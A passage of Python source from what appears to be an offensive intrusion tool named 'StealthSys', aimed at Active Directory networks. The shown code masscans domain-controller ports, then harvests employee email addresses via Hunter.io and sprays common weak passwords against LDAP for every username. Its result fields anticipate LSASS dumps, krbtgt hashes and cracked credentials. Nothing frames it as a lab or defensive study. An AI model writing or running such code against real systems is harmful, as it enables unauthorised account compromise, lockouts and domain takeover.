                command = [str(masscan), "-iL", str(masscan_targets), "-p88,135,139,389,445,636,3268,3269", "--rate=50", "--output-format", "json", "-oJ", str(masscan_output)]
                await self._execute_command(command)
                if await aiofiles.os.path.exists(masscan_output):
                    async with aiofiles.open(masscan_output, 'r') as f:
                        content = await f.read()
                    open_ports = {}
                    for line in content.splitlines():
                        try:
                            item = json.loads(line)
                            ip = item['ip']
                            for port in item['ports']:
                                open_ports.setdefault(ip, []).append(str(port['port']))
                        except json.JSONDecodeError:
                            continue
                    self.job.recon_results["open_ports_by_ip"] = open_ports
                    await aiofiles.os.remove(masscan_output)
        return True

    async def credential_harvest_spray(self) -> bool:
        print("[StealthSys] --- Credential Harvest & Spray ---")
        self.job.harvest_results = {
            "usernames": [], "password_list": [], "cracked_credentials": [],
            "lsass_dumps": [], "krbtgt_hash": None, "domain_sid_harvested": None,
            "password_policy": {}, "detected_lockouts": [], "spray_attempts": {}
        }
        username_config = self.config.get("credential_harvest_spray", {}).get("username_generation", {})
        usernames = set()
        if username_config.get("hunterio", {}).get("enabled", False) and self.config.get("api_keys", {}).get("hunterio"):
            hunterio_tool = await self._get_tool_path('hunterio_tool')
            if hunterio_tool:
                stdout, _ = await self._execute_command([str(hunterio_tool), '--domain', self.job.target.root_domains[0], '--api-key', self.config["api_keys"]["hunterio"]])
                emails = [e.strip() for e in stdout.splitlines() if "@" in e]
                usernames.update(emails)
        self.job.harvest_results["usernames"] = list(usernames)
        password_config = self.config.get("credential_harvest_spray", {}).get("password_spray", {})
        passwords = set(password_config.get("common_weak_passwords", ["Password1!", "Welcome1"]))
        self.job.harvest_results["password_list"] = list(passwords)
        spray_config = password_config
        if spray_config.get("enabled", True) and usernames and passwords:
            for username in usernames:
                for password in passwords:
                    for service in spray_config.get("target_services", ["ldap"]):
                        await self._execute_command(["ldap_tool", "--host", self.job.target.potential_ad_hosts[0], "--username", username, "--password", password, "--action", "auth_bind"])
        return True
